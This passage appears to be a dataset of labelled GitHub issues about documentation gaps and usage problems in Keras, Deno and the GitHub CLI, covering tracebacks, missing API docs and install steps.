deepcopy\r\n    y = copier(x, memo)\r\n  File \"T:\\Conda\\Envs\\Kitov-38842-DKtv\\lib\\copy.py\", line 243, in _deepcopy_dict\r\n    y[deepcopy(key, memo)] = deepcopy(value, memo)\r\n  File \"T:\\Conda\\Envs\\Kitov-38842-DKtv\\lib\\copy.py\", line 182, in deepcopy\r\n    y = _reconstruct(x, rv, 1, memo)\r\n  File \"T:\\Conda\\Envs\\Kitov-38842-DKtv\\lib\\copy.py\", line 306, in _reconstruct\r\n    y.__dict__.update(state)\r\nAttributeError: 'NoneType' object has no attribute 'update'\r\n\r\n\r\n  4)File \"T:\\Conda\\Envs\\Kitov-38842-DKtv\\lib\\copy.py\", line 155, in deepcopy\r\n    y = copier(x, memo)\r\n  File \"T:\\Conda\\Envs\\Kitov-38842-DKtv\\lib\\copy.py\", line 223, in _deepcopy_tuple\r\n    y = [deepcopy(a, memo) for a in x]\r\n  File \"T:\\Conda\\Envs\\Kitov-38842-DKtv\\lib\\copy.py\", line 223, in <listcomp>\r\n    y = [deepcopy(a, memo) for a in x]\r\n  File \"T:\\Conda\\Envs\\Kitov-38842-DKtv\\lib\\copy.py\", line 151, in deepcopy\r\n    cls = type(x)\r\nRecursionError: maximum recursion depth exceeded while calling a Python object\r\n\r\nHow can i save the model with Lambda layer?\r\n\r\nThe python version in 3.5, Keras is 2.2.2, tensorflow is 1.10.0\r\n\r\nThank You!"},{"labels":["documentation"],"text":"In documentation for SeparableConv1D data_format parameter explanation includes an extra dimension (width or height) \r\n![image](https://user-images.githubusercontent.com/7511567/43028531-fc815d36-8c45-11e8-9d26-747c67c05d72.png)\r\n)\r\nThis only makes sense for Conv2D layers and is contrary to the corresponding doc from TensorFlow:\r\n![image](https://user-images.githubusercontent.com/7511567/43001926-aa976834-8bec-11e8-99db-b613a6d3ef85.png)\r\n"},{"labels":[null,"documentation"],"text":"Keras : 2.2.0\r\nTensorflow-GPU: 1.8.0/ 1.9.0 (Both versions have the same issue)\r\n\r\nProblem: When using an input with rank greater than 2 in a Dense layer, \"Dimensions must be equal\" exception will be thrown from Tensorflow. \r\n\r\nIf using use_bias=False in Dense layer, it is OK.\r\nIf using Reshape before supply to Dense layer, it is OK.\r\n\r\nWith above symptons , it seems something is wrong when handling the bias with an input of rank size over 2. According to the documents: Note: if the input to the layer has a rank greater than 2, then it is flattened prior to the initial dot product with kernel.\r\n \r\nHere is the short script to reproduce the issue:\r\n\r\n```\r\nfrom keras import Input, Model\r\nfrom keras.layers import Dense, Reshape\r\n\r\ndef build_model():\r\n    X = Input(shape=(30, 40))\r\n    output = Dense(10, activation='tanh')(X)\r\n    model = Model(inputs=X, outputs=output)\r\n\r\n\r\ndef main():\r\n    build_model()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()\r\n```\r\n\r\nHere is the exception:\r\n```\r\nUsing TensorFlow backend.\r\nTraceback (most recent call last):\r\n  File \"/home/stiffme/PycharmProjects/neural_network_transfer/venv/lib/python3.6/site-packages/tensorflow/python/framework/ops.py\", line 1567, in _create_c_op\r\n    c_op = c_api.TF_FinishOperation(op_desc)\r\ntensorflow.python.framework.errors_impl.InvalidArgumentError: Dimensions must be equal, but are 30 and 10 for 'dense_1/add' (op: 'Add') with input shapes: [?,30,10], [1,10,1].\r\n\r\nDuring handling of the above exception, another exception occurred:\r\n\r\nTraceback (most recent call last):\r\n  File \"/home/stiffme/PycharmProjects/Dense_Concate/main.py\", line 15, in <module>\r\n    main()\r\n  File \"/home/stiffme/PycharmProjects/Dense_Concate/main.py\", line 11, in main\r\n    build_model()\r\n  File \"/home/stiffme/PycharmProjects/Dense_Concate/main.py\", line 6, in build_model\r\n    output = Dense(10, activation='tanh')(X)\r\n  File \"/home/stiffme/PycharmProjects/neural_network_transfer/venv/lib/python3.6/site-packages/keras/engine/topology.py\", line 619, in __call__\r\n    output = self.call(inputs, **kwargs)\r\n  File \"/home/stiffme/PycharmProjects/neural_network_transfer/venv/lib/python3.6/site-packages/keras/layers/core.py\", line 879, in call\r\n    output = K.bias_add(output, self.bias)\r\n  File \"/home/stiffme/PycharmProjects/neural_network_transfer/venv/lib/python3.6/site-packages/keras/backend/tensorflow_backend.py\", line 3781, in bias_add\r\n    x += reshape(bias, (1, bias_shape[0], 1))\r\n  File \"/home/stiffme/PycharmProjects/neural_network_transfer/venv/lib/python3.6/site-packages/tensorflow/python/ops/math_ops.py\", line 979, in binary_op_wrapper\r\n    return func(x, y, name=name)\r\n  File \"/home/stiffme/PycharmProjects/neural_network_transfer/venv/lib/python3.6/site-packages/tensorflow/python/ops/gen_math_ops.py\", line 297, in add\r\n    \"Add\", x=x, y=y, name=name)\r\n  File \"/home/stiffme/PycharmProjects/neural_network_transfer/venv/lib/python3.6/site-packages/tensorflow/python/framework/op_def_library.py\", line 787, in _apply_op_helper\r\n    op_def=op_def)\r\n  File \"/home/stiffme/PycharmProjects/neural_network_transfer/venv/lib/python3.6/site-packages/tensorflow/python/framework/ops.py\", line 3392, in create_op\r\n    op_def=op_def)\r\n  File \"/home/stiffme/PycharmProjects/neural_network_transfer/venv/lib/python3.6/site-packages/tensorflow/python/framework/ops.py\", line 1734, in __init__\r\n    control_input_ops)\r\n  File \"/home/stiffme/PycharmProjects/neural_network_transfer/venv/lib/python3.6/site-packages/tensorflow/python/framework/ops.py\", line 1570, in _create_c_op\r\n    raise ValueError(str(e))\r\nValueError: Dimensions must be equal, but are 30 and 10 for 'dense_1/add' (op: 'Add') with input shapes: [?,30,10], [1,10,1].\r\n```"},{"labels":["documentation"],"text":"The default value of said parameter is `None`. As I understand it, this will result in the Lambda layer's discarding of the previous mask. From the source code of the Lambda layer, the mask parameter may or may not be a callable. In the latter case, it takes parameters `mask` and `inputs`, but I do not understand how such a callable would behave or what it would yield. It would be great to have at least an example of a mask callable that simply forwards the mask it receives.  \r\n[Here](https://keras.io/layers/core/#lambda) is the doc for the Lambda layer."},{"labels":[null,null,"documentation"],"text":"This is likely a silly question, but how are activations meant to be handled between CuDNNLSTM/CuDNNGRU layers? The new CuDNNLSTM and CuDNNGRU layers do not contain an activation= parameter to insert activations between GRU cells, and there is no documentation on how activations interact with these new layers. Should they now be created as separate activation layers? \r\n\r\nOr does the optimization/speedup of these constructs come from not having activations between the layers?   Pointers to documentation I may have missed are always appreciated.   \r\n\r\n\r\nPlease make sure that the boxes below are checked before you submit your issue. If your issue is an implementation question, please ask your question on [StackOverflow](http://stackoverflow.com/questions/tagged/keras) or [join the Keras Slack channel](https://keras-slack-autojoin.herokuapp.com/) and ask there instead of filing a GitHub issue.\r\n\r\nThank you!\r\n\r\n- [X] Check that you are up-to-date with the master branch of Keras. You can update with:\r\npip install git+git://github.com/fchollet/keras.git --upgrade --no-deps\r\n\r\n- [X] If running on TensorFlow, check that you are up-to-date with the latest version. The installation instructions can be found [here](https://www.tensorflow.org/get_started/os_setup).\r\n\r\n- [ ] If running on Theano, check that you are up-to-date with the master branch of Theano. You can update with:\r\npip install git+git://github.com/Theano/Theano.git --upgrade --no-deps\r\n\r\n- [ ] Provide a link to a GitHub Gist of a Python script that can reproduce your issue (or just copy the script here if it is short).\r\n"},{"labels":["documentation",null,null],"text":"https://deno.land/std/async and https://deno.land/std/signal are missing readme's - i assume it would be best to have one like the other modules to document the modules methods?"},{"labels":["documentation"],"text":"Make the point for deps.ts even clearer in documentation - PR follows in a few minutes.\r\n"},{"labels":["documentation",null,null],"text":"there are many exported functions in standard library but some functions' JSDocs are missing\r\n\r\nhere is the list of ts files that need to be updated\r\n\r\n- [ ] `encoding/hex.ts`\r\n- [ ] `encoding/toml.ts`\r\n- [ ] `fmt/colors.ts`\r\n- [ ] `fmt/printf.ts`\r\n- [ ] `fs/walk.ts`\r\n- [ ] `http/file_server.ts`\r\n- [ ] `io/streams.ts`\r\n- [ ] `io/util.ts`\r\n- [ ] `log/mod.ts`\r\n- [ ] `node/querystring`\r\n- [ ] `node/url.ts`\r\n- [ ] `node/util.ts`\r\n- [ ] `path.posix.ts`\r\n- [ ] `path/win32.ts`\r\n- [ ] `testing/assert.ts`\r\n- [ ] `testing/diff.ts`\r\n- [ ] `uuid/mod.ts`\r\n- [ ] `uuid/v1.ts`\r\n- [ ] `uuid/v4.ts`\r\n- [ ] `uuid/v5.ts`\r\n- [ ] `ws/mod.ts`\r\n"},{"labels":[null,"documentation"],"text":"Should demonstrate how to use ops (sync json would be easiest to grok)"},{"labels":["documentation"],"text":"I simply cannot find ANY documentation on the following extremely useful imports:\r\n\r\n```\r\nimport { BufReader, BufWriter } from 'https://deno.land/std@0.67.0/io/bufio.ts';\r\nimport { TextProtoReader }      from 'https://deno.land/std@0.67.0/textproto/mod.ts';\r\n```\r\n\r\nCan these please be documented. I'm a huge fan of Deno but right now I am literally copying & pasting code knowing that's going to break and hours later it eventually works but I have no idea how. It's like coding in the dark."},{"labels":["documentation",null],"text":"Seems documentation on std/fmt/colors.ts is missing/absent from std/fmt's README.md\r\n\r\nIt'd be nice to see the readme updated with 'API docs' for the colors script/module"},{"labels":["documentation"],"text":"WebAssembly\r\n  - [ ] Link to MDN sources\r\n  - [ ] Provide Rust program that compiles to provided bytes\r\n  - [ ] Write about instantiateStreaming currently not supported\r\n\r\nTypeScript\r\n  - [ ] Make a separate chapter\r\n\r\nIO model\r\n  - [ ] How IO work in Deno\r\n  - [ ] comparison with ReadableStream, WriteableStream\r\n  - [ ] how to convert to/from ReadableStream\r\n\r\n\r\nComparison with Node.js\r\n  - [ ] Make a separate chapter\r\n  - [ ] Compare most common Node APIs with Deno equivalents\r\n  - [ ] Write about popular Node packages that are built into Deno\r\n\r\nPlugins\r\n  - [ ] Link to example plugin\r\n  - [ ] Basic \"fetch.js\", deno_core::explanation\r\n\r\nExamples\r\n  - [x] Move higher in the menu order\r\n\r\nTools\r\n  - [x] Move “Debugger” to “Debugging your code” in “Getting started”\r\n  - [ ] Bundler - point out “for await of” does not work, it is an upstream bug, provide a workaround (ie. async iffe)\r\n\r\nDeploying your code\r\n  - [ ] Bundle it\r\n  - [ ] How to setup basic CI\r\n  - [ ] Best practices\r\n\r\nArchitecture\r\n  - [ ] Draw new diagram\r\n  - [x] Link to @ry’s talk about deno structure from Israel meetup https://www.youtube.com/watch?v=1b7FoBwxc7E\r\n\r\nBuilding from source\r\n  - [ ] Update\r\n  - [ ] Style guide - ask @piscisaureus to update it\r\n\r\n- [x] Provide special markers for Deno version and corresponding std version and automatically insert in all examples - eg. `$DENO_VERSION$`/`$STD_VERSION$`\r\n\r\n- [ ] Links to API reference, std library should be visible on every page of the manual\r\n\r\nTesting\r\n- [ ] how tests are registered\r\n- [ ] processing order\r\n- [ ] concurrency\r\n\r\nStd:\r\n- [ ] All imports in readme examples should be versioned, and bumped on release"},{"labels":["documentation",null],"text":"Deno.Process probably needs a bit more documentation:\r\n\r\n- if `close()` is called, `status()` will throw an exception with a bad resource id.\r\n- `kill()` followed by a `status()` works fine\r\n- I would expect `status()` to always work regardless of how the process was terminated.\r\n\r\n\r\nI would have expected status() to resolve its promise regardless of how the Process is closed/kill or otherwise.\r\n\r\nMy use of Deno.run() is running a server that I can use for tests. So this creates interesting because if things don't close properly, the tests will fail with resource leaks (love that).\r\n\r\n\r\n"},{"labels":[null,"documentation"],"text":"The unstable doc shows `{certificate, hostname, port}` as a snippet in https://doc.deno.land/https/raw.githubusercontent.com/denoland/deno/master/cli/js/lib.deno.unstable.d.ts#Deno.startTls.\r\n\r\n[port is likely not needed for Deno.startTls]\r\n\r\nHowever, https://doc.deno.land/https/raw.githubusercontent.com/denoland/deno/master/cli/js/lib.deno.unstable.d.ts#Deno.StartTlsOptions only has `{certificate, hostname}`.\r\n\r\nAlso - for client certificate authentication, the client certificate, key, and a ca certificate will be required (for self-signed cert conditions).\r\n"},{"labels":["documentation"],"text":"https://deno.land/manual/tools"},{"labels":["documentation"],"text":"https://deno.land/manual/contributing/development_tools#profiling\r\n\r\nThe v8 tools don't seem to be pulled `cargo build -vv` or `V8_FROM_SOURCE=1 cargo build -vv`. Resorting to v8 documentation (and the google toolchain installation).\r\n\r\nWould be great, if instead deno itself embedded the tool to convert the capture profile logs (as nodejs does).\r\n"},{"labels":[null,"documentation"],"text":"![image](https://user-images.githubusercontent.com/28331609/83350132-874d3180-a36c-11ea-9726-19aea226453c.png)\r\n"},{"labels":["documentation"],"text":"Looks like IntelliJ got official Deno plugin: https://plugins.jetbrains.com/plugin/14382-deno \r\n\r\nManual entry about debugging should be updated: https://deno.land/manual/tools/debugger"},{"labels":[null,"documentation"],"text":"The diagram shows libdeno (C++). I could be wrong, but isn't this replaced with rusty_v8?\r\n\r\nhttps://deno.land/manual/contributing/architecture#schematic-diagram"},{"labels":["documentation",null],"text":"Docs for following APIs should be updated:\r\n- `Deno.read()`\r\n- `Deno.readSync()`\r\n- `Deno.write()`\r\n- `Deno.writeSync()`\r\n\r\nIt's not sufficiently explained that these function are the lowest level APIs and most users should not work with them directly. It is  **crucial to explain in bold** that it's not guaranteed that full buffer will be read/written in a single call. \r\n\r\nIn most cases it's `Deno.readAll()` or `Deno.writeAll()` that should be used."},{"labels":[null,"documentation"],"text":"Deno `Conn`s provide a `Reader`, `Writer`, and `Closer`. The first two are promise driven apis, the last one is not.\r\n\r\nThere are possibly many async operations (one trying to read, and many other async writes) in an active connection.\r\nWhen calling `close()` on the connection, it is possible that there are many pending writer ops, enough that any simple test reading/writing will fail with resource leakage (thanks for this).\r\n\r\nThis means that in order to close in a somewhat clean way, all API clients will have to set up a promise that resolves on a read failure (similar issue on `listen`) and track the individual promises returned by write into a stack and `shift()` them out as they resolve.\r\n\r\nThe setup to call `close()` typically means setting up a flag to ignore any read/write attempts from some other async operation trying to use the connection, and then waiting on the reader promise and all the write promises to resolve/fail. Only then can `close()` be called.\r\n\r\nSince the `Conn` should know about the state of the read and the number of pending writes scheduled, it seems reasonable to prevent much of this boilerplate by simply returning a promise from close(), which would signal at that point when the controlling process can safely exit or whatnot.\r\n\r\n"},{"labels":[null,"documentation"],"text":"I'm not hugely familiar with CLI standards, but I don't think I've ever run in to the requirement that --flags precede the positional arguments. I spent a long while trying to get `--allow-net` to work before realising this was necessary.\r\n\r\n`deno run --allow-net something.ts` vs `deno run something.ts --allow-net`\r\n\r\nIs there any reason not to support both forms?\r\n\r\nAlternately, a warning that the arguments were being ignored as invalid would have helped me understand."},{"labels":["documentation"],"text":"Both are currently empty:\r\nhttps://deno.land/manual/tools/dependency_inspector\r\nhttps://deno.land/manual/tools/documentation_generator\r\n"},{"labels":[null,"documentation"],"text":"The concept of _ops_ is mentioned in a few different locations in passing, but the manual should provide (at least) a high level overview of what they are, how they are consumed by the Deno \"front-end,\" and the process for adding new ops.\r\n\r\nExisting literature: https://github.com/denoland/deno/blob/master/docs/contributing.md#adding-ops-aka-bindings"},{"labels":["documentation",null],"text":"Using a dev build of https://github.com/denoland/vscode_deno\r\n\r\n![image](https://user-images.githubusercontent.com/2193314/81877046-f63b2580-9538-11ea-8a2e-74000abd08a4.png)\r\n\r\nThis is because of these lines:\r\n\r\nhttps://github.com/denoland/deno/blob/d397b86c6cea1517342dfa92055d8ed00c564ee1/cli/js/lib.deno.ns.d.ts#L803-L805\r\n\r\nRecommendation:\r\n\r\n```\r\n    *      await Deno.mkdir(\"new_dir\"); \r\n    *      await Deno.mkdir(\"nested/directories\", { recursive: true }); \r\n    *      await Deno.mkdir(\"restricted_access_dir\", { mode: 0o700 }); \r\n```\r\n\r\nOr:\r\n\r\n```\r\n    * ```ts\r\n    * await Deno.mkdir(\"new_dir\"); \r\n    * await Deno.mkdir(\"nested/directories\", { recursive: true }); \r\n    * await Deno.mkdir(\"restricted_access_dir\", { mode: 0o700 }); \r\n    * ```\r\n```\r\n\r\nWe use the latter in the VS Code API:\r\n\r\n![image](https://user-images.githubusercontent.com/2193314/81877301-89745b00-9539-11ea-9e99-429cf9d6bd8d.png)\r\n"},{"labels":["documentation",null],"text":"\"resolves to the number of bytes written from p (0 <= n <= p.byteLength)\"\r\n\r\nbut also\r\n\r\n\"must reject with a non-null error if would resolve to n < p.byteLength\"\r\n\r\nSo which one is it: can it resolve with `n < p.byteLength` or not?\r\n\r\nAlso, would be nice to clarify if user can/implementor must support calling `write()` before previously returned promise has resolved."},{"labels":[null,"documentation"],"text":"I am currently trying to make use of Deno's native plugin API, and I've been having a hard time trying to gather the basic resources for plugin development. For the record, I've taken a look at a few implementations alongside the associated files with [`lib.rs`](https://github.com/denoland/deno/blob/master/core/lib.rs) found in `libdeno`.\r\n\r\nIs there any documentation for plugin development in Deno? If not, can we look into making one? If there does exist a solution, I'd be willing to migrate from the horrors of Node Addons. What I'm primary looking for is a:\r\n\r\n- Smooth development process and fluid production build release\r\n- Method to compile plugin with TypeScript as single executable\r\n\r\nCf. [`deno-plugin-prepare`](https://github.com/manyuanrong/deno-plugin-prepare), [`deno-webview`](https://github.com/eliassjogreen/deno_webview/)."},{"labels":["documentation"],"text":""},{"labels":["documentation",null],"text":"Deno strives to be browser compatible where possible; that means we use quite a few Web APIs. \r\n\r\nThere is not much docs for supported Web APIs at the moment and before 1.0 is released that situation must change. Some of APIs and not fully aligned to spec, while others are not fully implemented (#3557). All that knowledge should be written down and presented to end users to avoid multiple questions/bug reports about purposeful incompatibilities and/or missing implementations."},{"labels":[null,"documentation"],"text":"What is the minimum set of token permissions needed for the github cli to function?\r\n\r\nIt looks like \"read: org\" and \"repo\" but can this be documented somewhere?  "},{"labels":["documentation",null],"text":"# Feedback\r\n\r\n## Praise\r\n\r\nI didn't learn about the GH CLI until it came out of beta, but I'm testing it now and figuring out how to incorporate it into my worflow. I think it's a great addition to GH.\r\n\r\n## Recommendation\r\n\r\nWhile browsing the [Manual](https://cli.github.com/manual/) pages, I noticed some instances where we use \"**Master**\" as an example for a branch name (screenshot below). Would it make sense to transition these examples to use \"**Main**\" to match the overall effort made by GH and the community at large?\r\n\r\n![Example of \"master\" vs \"main\" usage](https://user-images.githubusercontent.com/21162065/93616267-5e879100-f989-11ea-8b6f-394a5798455a.png)\r\n\r\n_Screenshot taken from [gh pr create](https://cli.github.com/manual/gh_pr_create) page._\r\n\r\n\r\nThank you!"},{"labels":[null,"documentation",null],"text":"### Describe the bug\r\n\r\nOn Windows 10, after successfully authenticate using the cli, I tried to run the command `gh repo view TS-RnD/entitlement` and it displayed the following error message:\r\n\r\n![image](https://user-images.githubusercontent.com/55927613/93583373-aca59000-f99b-11ea-89a2-0e5d736ae728.png)\r\n\r\n### Steps to reproduce the behavior\r\nFollow the commands I ran on the cli in the same order:\r\n\r\n![image](https://user-images.githubusercontent.com/55927613/93583426-c050f680-f99b-11ea-97c5-36a09820758b.png)\r\n\r\nIt is the same for HTTPS:\r\n![image](https://user-images.githubusercontent.com/55927613/93583622-0312ce80-f99c-11ea-8087-0e25bedfc832.png)\r\n\r\n### Expected vs actual behavior\r\n\r\nI should be able to run `gh repo view TS-RnD/entitlement` after succesfully authenticate with the cli.\r\n"},{"labels":["documentation",null,null],"text":"### Describe the feature or problem you’d like to solve\r\n\r\nThe `Short` parameter used for commands is inconsistent and most do not provide any information beyond what is already provided through the name.\r\n\r\n```console\r\nCORE COMMANDS\r\n  gist:       Create gists\r\n  issue:      Manage issues\r\n  pr:         Manage pull requests\r\n  release:    Manage GitHub releases\r\n  repo:       Create, clone, fork, and view repositories\r\n```\r\n\r\n`gist` is described as `Create gists` yet you can also view and edit gists,`issue` describes \"managing\" issues and `repo` lists the functionality supported.\r\n\r\n### Proposed solution\r\n\r\nDecide on a standard for the `Short` name. \r\n\r\nI think there's a few different options, each of which has pros and cons. The conclusion I've come to is that because the CLI is _typically_ used by power-users (\"Goodbye, context switching.\") that the best `Short` description has high information density.\r\n\r\nListing all of the commands supported could be automated (e.g: `Short` could simply be a dynamic comma separated list) which would reduce the maintenance burden, however it might become unwieldy as new functionality is added -- `pr` already has 12 supported commands.\r\n\r\nAnother option could be to pick a subset of the commands that provide enough context to inform the user about the depth of support, for example `pr` supports `reopen` which provides an indication that status can be managed so `reopen (+2 more)` is as useful as `reopen, close and ready`.\r\n\r\nAnother option could be to describe the resources as products/features: I don't think that provides as much value to power-users, _but_ as the CLI functionality expands and new product lines are introduced it might become more valuable -- if I didn't know what a gist is, I'd benefit from this approach.\r\n\r\n#### Product Description\r\n\r\n```console\r\nCORE COMMANDS\r\n  gist:       Share content privately or publicly\r\n  issue:      Keep track of tasks within your team\r\n  pr:         Participate in living conversations about changes\r\n  release:    Package software for people to use\r\n  repo:       Keep and collaborate on code with GitHub\r\n```\r\n\r\n#### Curated List\r\n\r\n```console\r\nCORE COMMANDS\r\n  gist:       create, edit, list and view Gists\r\n  issue:      create, list and close Issues (+3 more)\r\n  pr:         create, review and merge Pull Requests (+9 more)\r\n  release:    create, download and view Releases (+3 more)\r\n  repo:       clone, create, fork and view Repositories\r\n```\r\n\r\n#### Complete List\r\n\r\n```console\r\nCORE COMMANDS\r\n  gist:       create, edit, list and view\r\n  issue:      close, create, list, reopen, status and view\r\n  pr:         checkout, checks, close, create, diff, list, merge, ready, reopen, review, status and view\r\n  release:    create, delete, download, list, upload and view\r\n  repo:       clone, create, fork and view\r\n```\r\n\r\n### Additional context\r\n\r\nDefinitely not a big issue, just some polish! I'm happy to PR any changes that are agreed upon: creating an issue first for discussion per the contribution guidelines. After working through this issue I've decided I like the curated list (`(+n more)` option) most.\r\n\r\n:page_facing_up:"},{"labels":["documentation",null],"text":"### Describe the feature or problem you’d like to solve\r\n\r\nI can't find any information on the website or in the CLI help command about where authentication information is stored.\r\n\r\n### Proposed solution\r\n\r\nDocument where GH CLI stores authentication credentials. Also explain the relationship of this with existing GitHub credentials you may have on your system, like an SSH key or git https credentials in the keychain.\r\n\r\nThis helps the user understand the security and practical implications of logging in to the CLI.\r\n"},{"labels":["documentation",null],"text":"### Describe the bug\r\n\r\nProblems encountered while following linux installation instructions. \r\nUsing Linux Mint 19.3\r\n\r\nNo `apt-add-repository` command. Should be `add-apt-repository`.\r\nNo `-u` for `add-apt-repository`, works fine without `-u`\r\n`apt install gh` before `apt update`\r\n\r\nSuccessful install:\r\n```\r\nsudo apt-key adv --keyserver keyserver.ubuntu.com --recv-key C99B11DEB97541F0\r\nsudo add-apt-repository https://cli.github.com/packages\r\nsudo apt update\r\nsudo apt install gh\r\n```\r\n"},{"labels":["documentation"],"text":"### Describe the bug\r\n\r\nWhen viewing the `gh pr checks --help` page, we are missing context in regards to the flag. It should show that a pull request number is an acceptable replacement for the flag. Currently we show:\r\n\r\n![Screen Shot 2020-09-11 at 7 27 35 AM](https://user-images.githubusercontent.com/14828183/92955167-62069f80-f400-11ea-88d7-15a9ca3e6fbc.png)\r\n \r\nbut it should be something like `gh pr checks [pull request number] or similar.\r\n\r\nAn Example section might be helpful too, especially if we add this feature https://github.com/cli/cli/issues/1682"},{"labels":["documentation"],"text":"In local\r\n```\r\n$ gh issue create\r\nCreating issue in cli/cli\r\n```\r\n\r\nIn docs (https://cli.github.com/manual/examples#creating)\r\n```\r\n$ gh issue create\r\nCreating pull request for feature-branch into master in owner/repo\r\n```\r\n\r\n**Creating issue in cli/cli** vs **Creating pull request**"},{"labels":["documentation"],"text":"### Instances to update\r\n\r\n_In this repository_\r\n- [x] README installation instructions\r\n\r\n_In other repositories_\r\n- [x] \"Open with\" dialog on PRs (@mislav?)\r\n- [x] Clone dialog (in progress) (@mislav)\r\n- [x] Marketing site (in progress) (@ampinsk)"},{"labels":["documentation",null],"text":"### Describe the feature or problem you’d like to solve\r\n\r\nI'd like to be able to run `gh` cli from within a github action. The only install action I see is to manually download on the linux-based github runner (container) is to curl a hard-coded url, which will be immediately stale and will need it's version updated periodically. Is this the best way? Is it already installed on github runners? Some documentation here would be extremely helpful. Thanks!\r\n\r\n### Proposed solution\r\n\r\nDocumentation on the recommended way to run within github actions would be much appreciated.\r\n\r\n### Additional context\r\n\r\nI've searched google and the available repo docs and github docs to no avail.\r\n\r\n"},{"labels":[null,"documentation"],"text":"In PR #1432 I changed the way `cli` should be installed on Arch Linux.\r\n\r\nHowever this change isn't reflected on [Github CLI Docs Page](https://cli.github.com/manual/installation). \r\n\r\nThe [`docs`](https://github.com/cli/cli/tree/trunk/docs) folder `\"is used for documentation related to developing\"`. Is there any way that we can also update the docs on the page to avoid such situations in the future?\r\n\r\nI guess that's not the only change that isn't on the docs."},{"labels":["documentation"],"text":"### Describe the bug\r\n\r\nWhen merging a pull request from a branch, gh pr merge provides --delete-branch flag. However, this is set to true by default. This is not helpful when we want to retain the branch after merge.\r\n\r\n### Steps to reproduce the behavior\r\n\r\n1. Create a pr using gh pr create --title 'something' --body 'some more text'\r\n2. Note down the pull request number\r\n3. Merge the PR using gh pr merge --merge numPullRequest.\r\n\r\n### Expected vs actual behavior\r\n\r\nI expect the branch to be retained if I don't specify --delete-branch. However, since this is future by default, specifying this flag or not has no impact.\r\n\r\n"},{"labels":[null,"documentation"],"text":"### Describe the bug\r\n\r\nThe \"LEARN MORE\" section in the new help docs suggest using `gh <command> <subcommand> --help` but that results in `unknown command --help`. The usage info is printed so the user's desire is largely fulfilled despite the confusing error at the top.\r\n\r\n### Steps to reproduce the behavior\r\n\r\n1. run `gh help pr status`\r\n\r\n### Expected vs actual behavior\r\n\r\nExpected: we recommend `gh help <command> <subcommand>`\r\n\r\nActual: we recommend `gh <command> <subcommand> --help`\r\n"},{"labels":["documentation"],"text":"I find it useful to run the latest code rather than the one in the Debian package.\n\nHere is how I did that on Debian:\n\n1. As root, I ran:\n\n```bash\napt install golang-1.14\n```\n\nTo my surprise, this installed the `go` executable in the `/usr/lib/go-1.14/bin` directory, which is not in the PATH.\n\nSo, to compile `gh` I had to use the following command:\n\n```\nPATH=\"/usr/lib/go-1.14/bin:$PATH\" make\n```\n\nFinally, I created a symlink to the generated executable in my private bin directory `~/bin`.\n\nI realise some aspects of this are distribution-specific and am willing\nto write documentation that takes out this aspects if this wished\nby the community.\n"},{"labels":["documentation"],"text":"This is somehow related to #1085.\n\nMany commands use escape sequences, I am not sure why exactly but assume it's to add colours or underline text. It would be helpful to be able to turn this behaviour off because in a plain Linux ocnsole these sequences are just messing things up. Here too a configuraiton setting could be the right way to go.\n"},{"labels":["documentation",null],"text":"I saw in the doc that I could set an editor with `gh config`.\r\n\r\nCould you put an example in the docs of how I could use Visual Studio Code as the default editor ?"},{"labels":["documentation"],"text":"Hi.\r\n\r\nInterested in being able to create a remote repos within Github from my local cmdline.\r\n\r\nThe github user is fooUser\r\nfooUser has setup the ssh -- user/passwd\r\n\r\n\r\nThe process has created a local repository\r\nI'm in the local dir for the repository\r\n\r\n/foo/myRepo\r\n\r\nAs I understand the gh cmd to create the repo.\r\ngh repo create \"name\"\r\n\r\nShould name be the name of the local repo  -- in this case \"myRepo\" or something else??\r\n\r\nAt the same time, how in the world do I point gh at my Githb account??? is there some method of using ssh??\r\n\r\nA complete/simple example would be useful.\r\n\r\nthanks\r\n\r\n"},{"labels":["documentation"],"text":"### Describe the bug\r\nThe docs, in the case of labels, etc state: \"Add a label by name\", etc. This is implying that we are only accepting a single\r\n\r\n### Expected vs actual behavior\r\nThe docs should be changed, so as to show that we are actually accepting multiple labels, etc.\r\nExample: \"Add labels by name\""},{"labels":["documentation",null],"text":"### Describe the feature or problem you’d like to solve\r\n\r\nI prefer when commands have man pages, even if it's mostly telling you to run with `--help`.\r\n\r\n### Proposed solution\r\n\r\nI have a branch to add a basic man page and include it in builds [here](https://github.com/cli/cli/compare/trunk...mtfurlan:docs/manpage).\r\nThe contributing guidelines suggest opening an issue before a PR, so here we are.\r\n\r\nI based this off how [Exoscale cli](https://github.com/exoscale/cli) packages manpages as they also use goreleaser.\r\nIt would be cool if gh also generates manpages from the same place the help flag and web documentation come from, but I don't know enough go to help with that at this point in time.\r\n"},{"labels":["documentation",null],"text":"Running this in a shell such as bash or zsh will not produce the sometimes-expected result of looking up issues under the `help wanted` label:\r\n\r\n```sh\r\n# doesn't work:\r\ngh issue list -l help wanted\r\n```\r\n\r\nThis is because the value `help wanted` should be quoted or escaped in one's shell to ensure that it's passed as a single value to `--label`, rather than as two distinct arguments `help` + `wanted` (where the latter wouldn't be interpreted as relating to `--label` at all):\r\n\r\n```sh\r\n# works:\r\ngh issue list -l \"help wanted\"\r\n\r\n# also works:\r\ngh issue list -l help\\ wanted\r\n```\r\n\r\nThis isn't a bug with CLI, but is a common pitfall for shell-users in general that we could ideally help our users detect and recover from. Possible approaches:\r\n\r\n- Include example of passing labels with spaces in `gh help issue list` docs\r\n- Detect extra, unaccounted arguments to `gh issue list` (`\"wanted\"` in the above example) and present an error such as “unrecognized argument 'wanted': did you forget to quote values with spaces?”\r\n\r\nOriginally reported by @tierninho\r\n\r\nLoosely related issues that stem as consequence of shell behavior (as opposed to being bugs in `gh`): https://github.com/cli/cli/issues/223 https://github.com/cli/cli/issues/595 https://github.com/cli/cli/issues/315"},{"labels":["documentation"],"text":"### Describe the bug\r\n\r\nAfter following the [instructions](https://cli.github.com/manual/gh_completion) for enabling shell completion I still can’t get the completion functionality to work. I’ve tried both the `eval` and Homebrew options. I’m on Mac OS 10.15.4  using zsh with Oh My Zsh and gh version 0.6.2.\r\n\r\n### Steps to reproduce the behavior\r\n1. Add the Homebrew completion [snippet](https://docs.brew.sh/Shell-Completion#configuring-completions-in-zsh) to `.zshrc`. and open a new terminal.\r\n2. Type `gh`\r\n3. Press <kbd>Tab</kbd>\r\n4. Run `eval \"$(gh completion -s zsh)”`\r\n5. Repeat steps 2-3\r\n\r\n### Expected vs actual behavior\r\n\r\nI expect to see completion options for `gh` commands but instead I get my shell’s standard file path completion.\r\n\r\n"},{"labels":["documentation"],"text":"**Problem:** running `gh completion` out of curiousity produces a long and potentially confusing bash 